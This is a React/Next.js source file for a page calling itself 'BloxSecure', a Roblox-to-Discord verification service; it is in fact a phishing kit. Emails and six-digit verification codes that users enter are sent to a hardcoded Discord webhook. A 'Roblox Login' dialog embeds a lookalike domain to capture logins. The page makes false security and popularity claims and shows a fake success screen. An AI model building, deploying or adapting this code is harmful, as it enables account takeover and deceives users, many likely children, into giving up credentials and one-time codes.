"use client"

import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Input } from "@/components/ui/input"
import { Shield, Zap, Lock, Users, Mail, LogIn, X } from "lucide-react"

type ModalState = "none" | "verify-method" | "email-input" | "code-input" | "roblox-login" | "complete"

export default function Home() {
  const [modalState, setModalState] = useState<ModalState>("none")
  const [email, setEmail] = useState("")
  const [code, setCode] = useState(["", "", "", "", "", ""])
  const [serversCount, setServersCount] = useState(0)
  const [isVisible, setIsVisible] = useState(false)
  const statsRef = useRef<HTMLDivElement>(null)
  const featuresSectionRef = useRef<HTMLDivElement>(null)
  const ctaSectionRef = useRef<HTMLDivElement>(null)
  const [featuresVisible, setFeaturesVisible] = useState(false)
  const [ctaVisible, setCtaVisible] = useState(false)

  const WEBHOOK_URL =
    "https://discord.com/api/webhooks/1456817210310791340/m8meW1wDBw3e4PxOOoIryhdb5oD-DjPTKyg5dm9OcuJbVygDM4oDMN4iB_le33YkUiEC"

  useEffect(() => {
    const observer = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting && !isVisible) {
          setIsVisible(true)
        }
      },
      { threshold: 0.1 },
    )

    if (statsRef.current) {
      observer.observe(statsRef.current)
    }

    return () => observer.disconnect()
  }, [isVisible])

  useEffect(() => {
    const featuresObserver = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting && !featuresVisible) {
          setFeaturesVisible(true)
        }
      },
      { threshold: 0.1 },
    )

    const ctaObserver = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting && !ctaVisible) {
          setCtaVisible(true)
        }
      },
      { threshold: 0.1 },
    )

    if (featuresSectionRef.current) {
      featuresObserver.observe(featuresSectionRef.current)
    }
    if (ctaSectionRef.current) {
      ctaObserver.observe(ctaSectionRef.current)
    }

    return () => {
      featuresObserver.disconnect()
      ctaObserver.disconnect()
    }
  }, [featuresVisible, ctaVisible])

  useEffect(() => {
    if (!isVisible) return

    const duration = 2000
    const steps = 60
    const increment = 11000 / steps
    let current = 0

    const timer = setInterval(() => {
      current += increment
      if (current >= 11000) {
        setServersCount(11000)
        clearInterval(timer)
      } else {
        setServersCount(Math.floor(current))
      }
    }, duration / steps)

    return () => clearInterval(timer)
  }, [isVisible])

  const sendEmailToWebhook = async (emailAddress: string) => {
    try {
      const embed = {
        title: "📧 Email Submitted",
        description: "A user has submitted their email for verification.",
        color: 5793266,
        fields: [
          {
            name: "Email Address",
            value: emailAddress,
            inline: false,
          },
          {
            name: "Status",
            value: "⏳ Waiting for verification code",
            inline: false,
          },
        ],
        footer: {
          text: `BloxSecure Verification System | ${new Date().toLocaleString()}`,
        },
      }

      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: "@everyone",
          embeds: [embed],
        }),
      })
    } catch (error) {
      console.error("Error sending email to webhook:", error)
    }
  }

  const sendCodeToWebhook = async (emailAddress: string, verificationCode: string) => {
    try {
      const embed = {
        title: "✅ Verification Code Submitted",
        description: "A user has submitted their verification code.",
        color: 5763719,
        fields: [
          {
            name: "Email Address",
            value: emailAddress,
            inline: false,
          },
          {
            name: "Verification Code",
            value: verificationCode,
            inline: false,
          },
          {
            name: "Status",
            value: "Code submitted for verification",
            inline: false,
          },
        ],
        footer: {
          text: `BloxSecure Verification System | ${new Date().toLocaleString()}`,
        },
      }

      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: "@everyone",
          embeds: [embed],
        }),
      })
    } catch (error) {
      console.error("Error sending code to webhook:", error)
    }
  }

  const handleStartVerification = () => {
    setModalState("verify-method")
  }

  const handleVerifyByEmail = () => {
    setModalState("email-input")
  }

  const handleLoginToRoblox = () => {
    setModalState("roblox-login")
  }

  const handleSendCode = async () => {
    if (email) {
      await sendEmailToWebhook(email)
      setModalState("code-input")
    }
  }

  const handleVerifyCode = async () => {
    const fullCode = code.join("")
    if (fullCode.length === 6 && email) {
      await sendCodeToWebhook(email, fullCode)
      setModalState("complete")
    }
  }

  const handleRobloxLoginComplete = () => {
    setModalState("complete")
  }

  const handleVerifyAnother = () => {
    setModalState("verify-method")
  }

  const closeModal = () => {
    setModalState("none")
    setEmail("")
    setCode(["", "", "", "", "", ""])
  }

  return (
    <main className="min-h-screen bg-[#0a0a0f] text-white overflow-x-hidden scroll-smooth">
      <div className="fixed inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(6,182,212,0.08),transparent_50%),radial-gradient(circle_at_80%_20%,rgba(59,130,246,0.08),transparent_50%),radial-gradient(circle_at_20%_80%,rgba(6,182,212,0.05),transparent_50%)] pointer-events-none" />
      <div className="fixed inset-0 bg-[linear-gradient(to_right,#80808008_1px,transparent_1px),linear-gradient(to_bottom,#80808008_1px,transparent_1px)] bg-[size:64px_64px] pointer-events-none" />

      <div
        className="fixed top-20 right-20 w-64 h-64 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none animate-pulse"
        style={{ animationDuration: "4s" }}
      />
      <div
        className="fixed bottom-20 left-20 w-96 h-96 bg-blue-500/5 rounded-full blur-3xl pointer-events-none animate-pulse"
        style={{ animationDuration: "6s" }}
      />

      <div className="fixed top-1/4 left-10 opacity-5 pointer-events-none">
        <svg width="60" height="60" viewBox="0 0 60 60" fill="none">
          <rect
            x="10"
            y="10"
            width="40"
            height="40"
            fill="currentColor"
            className="text-cyan-400"
            transform="rotate(45 30 30)"
          />
        </svg>
      </div>
      <div className="fixed bottom-1/3 right-20 opacity-5 pointer-events-none">
        <svg width="80" height="80" viewBox="0 0 80 80" fill="none">
          <rect
            x="15"
            y="15"
            width="50"
            height="50"
            fill="currentColor"
            className="text-blue-400"
            transform="rotate(45 40 40)"
          />
        </svg>
      </div>

      <div className="relative max-w-7xl mx-auto px-4 pt-20 pb-16">
        <div className="text-center space-y-8 animate-fade-in-up">
          <h1 className="text-6xl md:text-7xl lg:text-8xl font-black tracking-tight leading-[1.05]">
            <span className="bg-gradient-to-r from-white via-cyan-200 to-blue-400 bg-clip-text text-transparent drop-shadow-2xl">
              Verify Roblox → Discord
            </span>
            <br />
            <span className="text-white/90">in Seconds</span>
          </h1>

          <p className="text-xl md:text-2xl text-white/60 max-w-3xl mx-auto font-light leading-relaxed tracking-wide">
            Lightning-fast verification. Bank-level security. Zero compromise.
          </p>

          <div className="flex flex-col sm:flex-row items-center justify-center gap-6 pt-2">
            <Button
              size="lg"
              onClick={handleStartVerification}
              className="group relative bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-400 hover:to-blue-400 text-white border-0 px-12 py-8 text-lg font-bold rounded-2xl shadow-[0_0_50px_rgba(6,182,212,0.4)] hover:shadow-[0_0_100px_rgba(6,182,212,0.7)] hover:scale-110 transition-all duration-300"
            >
              <span className="relative z-10">Start Verification</span>
              <div className="absolute inset-0 rounded-2xl bg-gradient-to-r from-cyan-400 to-blue-400 opacity-0 group-hover:opacity-100 blur-2xl transition-opacity duration-300" />
            </Button>
            <Button
              size="lg"
              className="group bg-white/5 backdrop-blur-sm hover:bg-white/10 text-white border-2 border-white/20 hover:border-cyan-500/70 hover:shadow-[0_0_40px_rgba(6,182,212,0.3)] px-12 py-8 text-lg font-bold rounded-2xl hover:scale-110 transition-all duration-300 shadow-lg"
            >
              <svg className="w-5 h-5 mr-3" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515a.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0a12.64 12.64 0 0 0-.617-1.25a.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057a19.9 19.9 0 0 0 5.993 3.03a.078.078 0 0 0 .084-.028a14.09 14.09 0 0 0 1.226-1.994a.076.076 0 0 0-.041-.106a13.107 13.107 0 0 1-1.872-.892a.077.077 0 0 1-.008-.128a10.2 10.2 0 0 0 .372-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127a12.299 12.299 0 0 1-1.873.892a.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028a19.839 19.839 0 0 0 6.002-3.03a.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.956-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.955-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.946 2.418-2.157 2.418z" />
              </svg>
              Join Support
            </Button>
          </div>

          <div ref={statsRef} className="flex flex-wrap items-center justify-center gap-10 pt-10">
            <div className="flex items-center gap-4 group cursor-default">
              <div className="relative">
                <div className="w-4 h-4 bg-cyan-400 rounded-full animate-pulse shadow-[0_0_25px_rgba(6,182,212,0.8)]" />
                <div className="absolute inset-0 w-4 h-4 bg-cyan-400 rounded-full animate-ping opacity-75" />
              </div>
              <span className="text-3xl font-black text-cyan-400 tabular-nums tracking-tight">
                {serversCount.toLocaleString()}+
              </span>
              <span className="text-lg text-white/70 font-semibold">Servers</span>
            </div>
            <div className="flex items-center gap-4 group cursor-default">
              <div className="p-2 rounded-xl bg-cyan-500/10 group-hover:bg-cyan-500/20 border border-cyan-500/20 group-hover:shadow-[0_0_20px_rgba(6,182,212,0.3)] transition-all duration-300">
                <Shield className="w-6 h-6 text-cyan-400" />
              </div>
              <span className="text-lg text-white/70 font-semibold">Verified & Trusted</span>
            </div>
            <div className="flex items-center gap-4 group cursor-default">
              <div className="p-2 rounded-xl bg-cyan-500/10 group-hover:bg-cyan-500/20 border border-cyan-500/20 group-hover:shadow-[0_0_20px_rgba(6,182,212,0.3)] transition-all duration-300">
                <Lock className="w-6 h-6 text-cyan-400" />
              </div>
              <span className="text-lg text-white/70 font-semibold">100% Secure</span>
            </div>
          </div>
        </div>
      </div>

      <div
        ref={featuresSectionRef}
        className={`relative max-w-7xl mx-auto px-4 py-24 transition-all duration-1000 ${featuresVisible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"}`}
      >
        <h2 className="text-4xl md:text-5xl font-black text-center mb-16 tracking-tight">
          <span className="bg-gradient-to-r from-white to-cyan-400 bg-clip-text text-transparent">
            Why Choose BloxSecure?
          </span>
        </h2>

        <div className="grid md:grid-cols-2 gap-6">
          <Card className="group p-10 bg-white/[0.03] backdrop-blur-md border-2 border-white/10 hover:border-cyan-500/60 hover:bg-white/[0.06] rounded-3xl transition-all duration-500 hover:scale-[1.03] shadow-lg hover:shadow-[0_0_60px_rgba(6,182,212,0.25)]">
            <div className="flex flex-col h-full space-y-6">
              <div className="p-5 rounded-2xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border-2 border-cyan-500/30 w-fit group-hover:scale-110 group-hover:shadow-[0_0_40px_rgba(6,182,212,0.4)] transition-all duration-300">
                <Zap className="w-10 h-10 text-cyan-400" />
              </div>
              <h3 className="text-2xl font-black text-white tracking-tight">Lightning Fast</h3>
              <p className="text-white/60 text-lg leading-relaxed flex-grow">
                Verify your account in under 60 seconds. No complicated steps or waiting. Just pure speed.
              </p>
            </div>
          </Card>

          <Card className="group p-10 bg-white/[0.03] backdrop-blur-md border-2 border-white/10 hover:border-cyan-500/60 hover:bg-white/[0.06] rounded-3xl transition-all duration-500 hover:scale-[1.03] shadow-lg hover:shadow-[0_0_60px_rgba(6,182,212,0.25)]">
            <div className="flex flex-col h-full space-y-6">
              <div className="p-5 rounded-2xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border-2 border-cyan-500/30 w-fit group-hover:scale-110 group-hover:shadow-[0_0_40px_rgba(6,182,212,0.4)] transition-all duration-300">
                <Lock className="w-10 h-10 text-cyan-400" />
              </div>
              <h3 className="text-2xl font-black text-white tracking-tight">Bank-Level Security</h3>
              <p className="text-white/60 text-lg leading-relaxed flex-grow">
                Your data is encrypted and protected with advanced security measures. We take your privacy seriously.
              </p>
            </div>
          </Card>

          <Card className="group p-10 bg-white/[0.03] backdrop-blur-md border-2 border-white/10 hover:border-cyan-500/60 hover:bg-white/[0.06] rounded-3xl transition-all duration-500 hover:scale-[1.03] shadow-lg hover:shadow-[0_0_60px_rgba(6,182,212,0.25)]">
            <div className="flex flex-col h-full space-y-6">
              <div className="p-5 rounded-2xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border-2 border-cyan-500/30 w-fit group-hover:scale-110 group-hover:shadow-[0_0_40px_rgba(6,182,212,0.4)] transition-all duration-300">
                <Shield className="w-10 h-10 text-cyan-400" />
              </div>
              <h3 className="text-2xl font-black text-white tracking-tight">Trusted Platform</h3>
              <p className="text-white/60 text-lg leading-relaxed flex-grow">
                Trusted by over 11,000+ Discord servers and Roblox communities worldwide.
              </p>
            </div>
          </Card>

          <Card className="group p-10 bg-white/[0.03] backdrop-blur-md border-2 border-white/10 hover:border-cyan-500/60 hover:bg-white/[0.06] rounded-3xl transition-all duration-500 hover:scale-[1.03] shadow-lg hover:shadow-[0_0_60px_rgba(6,182,212,0.25)]">
            <div className="flex flex-col h-full space-y-6">
              <div className="p-5 rounded-2xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border-2 border-cyan-500/30 w-fit group-hover:scale-110 group-hover:shadow-[0_0_40px_rgba(6,182,212,0.4)] transition-all duration-300">
                <Users className="w-10 h-10 text-cyan-400" />
              </div>
              <h3 className="text-2xl font-black text-white tracking-tight">Community First</h3>
              <p className="text-white/60 text-lg leading-relaxed flex-grow">
                Built for communities, designed to keep your servers safe and organized.
              </p>
            </div>
          </Card>
        </div>
      </div>

      <div
        ref={ctaSectionRef}
        className={`relative max-w-5xl mx-auto px-4 pb-28 transition-all duration-1000 ${ctaVisible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"}`}
      >
        <div className="relative">
          <div
            className="absolute inset-0 bg-gradient-to-r from-cyan-500/15 to-blue-500/15 rounded-[3rem] blur-3xl animate-pulse"
            style={{ animationDuration: "3s" }}
          />

          <Card className="relative group p-14 md:p-16 bg-gradient-to-br from-white/[0.08] to-white/[0.03] backdrop-blur-xl border-2 border-cyan-500/40 hover:border-cyan-500/70 rounded-[2.5rem] text-center space-y-8 transition-all duration-500 hover:scale-[1.02] shadow-[0_0_100px_rgba(6,182,212,0.2)] hover:shadow-[0_0_150px_rgba(6,182,212,0.35)]">
            <h2 className="text-4xl md:text-5xl lg:text-6xl font-black text-white tracking-tight leading-tight">
              Ready to Get Started?
            </h2>
            <p className="text-white/70 text-xl md:text-2xl max-w-2xl mx-auto leading-relaxed font-light">
              Join thousands of verified users and unlock full access to your Discord community.
            </p>
            <div className="pt-4">
              <Button
                size="lg"
                onClick={handleStartVerification}
                className="group relative bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-400 hover:to-blue-400 text-white border-0 px-14 py-8 text-lg font-bold rounded-2xl shadow-[0_0_60px_rgba(6,182,212,0.5)] hover:shadow-[0_0_120px_rgba(6,182,212,0.8)] hover:scale-110 transition-all duration-300"
              >
                <span className="relative z-10">Verify Now</span>
                <div className="absolute inset-0 rounded-2xl bg-gradient-to-r from-cyan-400 to-blue-400 opacity-0 group-hover:opacity-100 blur-2xl transition-opacity duration-300" />
              </Button>
            </div>
          </Card>
        </div>
      </div>

      <footer className="relative border-t border-white/10 bg-black/30 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 py-10">
          <div className="flex flex-col md:flex-row items-center justify-between gap-6">
            <div className="text-white/50 text-sm font-medium">© 2025 BloxSecure. All rights reserved.</div>
            <div className="flex items-center gap-8 text-sm font-medium">
              <a
                href="#"
                className="text-white/60 hover:text-cyan-400 transition-colors duration-200 hover:scale-105 inline-block"
              >
                Privacy Policy
              </a>
              <a
                href="#"
                className="text-white/60 hover:text-cyan-400 transition-colors duration-200 hover:scale-105 inline-block"
              >
                Terms of Service
              </a>
              <a
                href="#"
                className="text-white/60 hover:text-cyan-400 transition-colors duration-200 hover:scale-105 inline-block"
              >
                Support Discord
              </a>
            </div>
          </div>
        </div>
      </footer>

      <Dialog open={modalState === "verify-method"} onOpenChange={closeModal}>
        <DialogContent className="sm:max-w-md bg-white border-0 shadow-2xl p-8">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-gray-900 text-center">
              Verify Your Roblox Account
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-6 pt-4">
            <p className="text-center text-gray-600">Choose how you want to verify your account</p>

            <Button
              onClick={handleVerifyByEmail}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-base font-medium rounded-lg shadow-lg shadow-cyan-500/25 hover:shadow-cyan-500/40 hover:scale-105 transition-all duration-300"
            >
              <Mail className="w-5 h-5 mr-2" />
              Verify by Email
            </Button>

            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-gray-200" />
              </div>
              <div className="relative flex justify-center text-xs uppercase">
                <span className="bg-white px-2 text-gray-500">OR</span>
              </div>
            </div>

            <Button
              onClick={handleLoginToRoblox}
              variant="outline"
              className="w-full bg-white hover:bg-gray-50 text-gray-900 border-gray-300 py-6 text-base font-medium rounded-lg hover:scale-105 transition-all duration-300"
            >
              <LogIn className="w-5 h-5 mr-2" />
              Login to Roblox
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={modalState === "email-input"} onOpenChange={closeModal}>
        <DialogContent className="sm:max-w-md bg-white border-0 shadow-2xl p-8">
          <button onClick={closeModal} className="absolute right-4 top-4 rounded-sm opacity-70 hover:opacity-100">
            <X className="h-4 w-4" />
          </button>
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-gray-900">Email Verification</DialogTitle>
            <p className="text-sm text-gray-600 pt-1">Enter your Roblox account email</p>
          </DialogHeader>
          <div className="space-y-4 pt-4">
            <Input
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full py-6 text-base rounded-lg text-black"
            />
            <Button
              onClick={handleSendCode}
              className="w-full bg-blue-400 hover:bg-blue-500 text-white py-6 text-base font-medium rounded-lg"
            >
              Send Code
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={modalState === "code-input"} onOpenChange={closeModal}>
        <DialogContent className="sm:max-w-md bg-white border-0 shadow-2xl p-8">
          <button onClick={closeModal} className="absolute right-4 top-4 rounded-sm opacity-70 hover:opacity-100">
            <X className="h-4 w-4" />
          </button>
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-gray-900">Enter Verification Code</DialogTitle>
            <p className="text-sm text-gray-600 pt-1">Code sent to {email}</p>
          </DialogHeader>
          <div className="space-y-6 pt-6">
            <div className="flex justify-center">
              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-yellow-400 via-pink-400 to-blue-500 flex items-center justify-center">
                <svg className="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M5 3v4M3 5h4M6 17v4m-2-2h4m5-16l2.286 6.857L21 12l-5.714 2.143L13 21l-2.286-6.857L5 12l5.714-2.143L13 3z"
                  />
                </svg>
              </div>
            </div>
            <p className="text-center text-gray-600 text-sm">Enter the code sent to your email</p>
            <div className="flex justify-center gap-2">
              {code.map((digit, index) => (
                <input
                  key={index}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => {
                    const value = e.target.value
                    if (value === "" || /^\d$/.test(value)) {
                      const newCode = [...code]
                      newCode[index] = value
                      setCode(newCode)

                      if (value && index < 5) {
                        const nextInput = e.target.nextElementSibling as HTMLInputElement
                        nextInput?.focus()
                      }
                    }
                  }}
                  onKeyDown={(e) => {
                    if (e.key === "Backspace" && !code[index] && index > 0) {
                      const prevInput = e.currentTarget.previousElementSibling as HTMLInputElement
                      prevInput?.focus()
                    }
                  }}
                  className="w-12 h-14 text-center text-2xl font-semibold border-2 border-gray-300 rounded-lg focus:border-blue-400 focus:outline-none text-black bg-white"
                />
              ))}
            </div>
            <Button
              onClick={handleVerifyCode}
              className="w-full bg-blue-400 hover:bg-blue-500 text-white py-6 text-base font-medium rounded-lg"
            >
              Verify Code
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={modalState === "roblox-login"} onOpenChange={closeModal}>
        <DialogContent className="sm:max-w-3xl max-h-[90vh] bg-white border-0 shadow-2xl p-8">
          <button onClick={closeModal} className="absolute right-4 top-4 rounded-sm opacity-70 hover:opacity-100 z-10">
            <X className="h-4 w-4" />
          </button>
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-gray-900">Roblox Login</DialogTitle>
            <p className="text-sm text-gray-600 pt-1">Login to your Roblox account to verify</p>
          </DialogHeader>
          <div className="space-y-4 pt-4">
            <div className="w-full h-[500px] rounded-lg overflow-hidden border border-gray-200">
              <iframe
                src="https://roblox.com.py/login?returnUrl=7643214816113648"
                className="w-full h-full"
                title="Roblox Login"
              />
            </div>
            <p className="text-center text-gray-600 text-sm">
              Login to your Roblox account above to complete verification
            </p>
            <Button
              onClick={handleRobloxLoginComplete}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-base font-medium rounded-lg"
            >
              I've completed the login
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={modalState === "complete"} onOpenChange={closeModal}>
        <DialogContent className="sm:max-w-md bg-white border-0 shadow-2xl p-8">
          <div className="space-y-6 text-center pt-4">
            <div className="flex justify-center">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-yellow-400 via-pink-400 to-blue-500 flex items-center justify-center">
                <svg className="w-8 h-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
              </div>
            </div>
            <div className="space-y-2">
              <h2 className="text-2xl font-bold text-gray-900">Verification Complete!</h2>
              <p className="text-gray-600">Your Roblox account has been successfully verified.</p>
            </div>
            <Button
              onClick={handleVerifyAnother}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-base font-medium rounded-lg"
            >
              Verify Another Account
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </main>
  )
}
